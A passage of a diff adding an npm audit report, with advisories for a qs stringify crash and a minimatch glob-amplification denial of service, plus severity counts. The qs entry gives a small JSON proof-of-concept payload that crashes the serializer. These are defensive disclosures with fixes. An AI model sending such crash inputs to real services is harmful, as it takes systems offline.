1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.\n\n### Impact\n\nOne small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.\n\n### Proof of Concept\n\n<details>\n<summary>Show the proof of concept</summary>\n\nChecked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.\n\n- Payload `{\"a\":[{\"toString\":\"x\"}]}` throws at `lib/stringify.js:156`.\n- Baseline `{\"a\":[\"x\",\"y\"]}` returns 200 with body `a=x%2Cy`.\n- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.\n- `encodeValuesOnly: true` throws via `utils.js:292`.\n- `plainObjects` parse plus comma throws.\n\n</details>\n\n### Suggested Fix\n\nBefore `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.",
+      "reported_by": null,
+      "title": "qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110816"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.7.0 <=6.16.0",
+      "github_advisory_id": "GHSA-6pq8-jhm2-2vcw",
+      "recommendation": "Upgrade to version 6.16.1 or later",
+      "patched_versions": ">=6.16.1",
+      "updated": "2026-10-29T02:22:33.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-704"
+      ],
+      "url": "https://github.com/advisories/GHSA-6pq8-jhm2-2vcw"
+    },
+    "1244623": {
+      "findings": [
+        {
+          "version": "10.2.6",
+          "paths": [
+            "lib__api-spec>orval>typedoc>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118764\n- https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8\n- https://github.com/isaacs/minimatch/releases/tag/v11.0.1\n- https://github.com/isaacs/minimatch/commit/297b6c1a01f2410b3ba1ebed14ba222d0c3c1033\n- https://github.com/isaacs/minimatch/commit/fd0b3ab9cbc5bf1aff1c99f1f46e413c2b3340da\n- https://github.com/advisories/GHSA-g3hv-75wg-m249",
+      "created": "2026-10-30T23:09:55.000Z",
+      "id": 1244623,
+      "npm_advisory_id": null,
+      "overview": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i < globParts.length - 1; i++) {\n  for (let j = i + 1; j < globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+      "reported_by": null,
+      "title": "minimatch has potential denial of service via globparts amplification",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118764"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=7.0.0 <11.0.1",
+      "github_advisory_id": "GHSA-g3hv-75wg-m249",
+      "recommendation": "Upgrade to version 11.0.1 or later",
+      "patched_versions": ">=11.0.1",
+      "updated": "2026-11-04T16:50:04.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-g3hv-75wg-m249"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 4,
+      "moderate": 16,
+      "high": 12,
+      "critical": 1
+    },
+    "dependencies": 645,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 645
+  }
+}
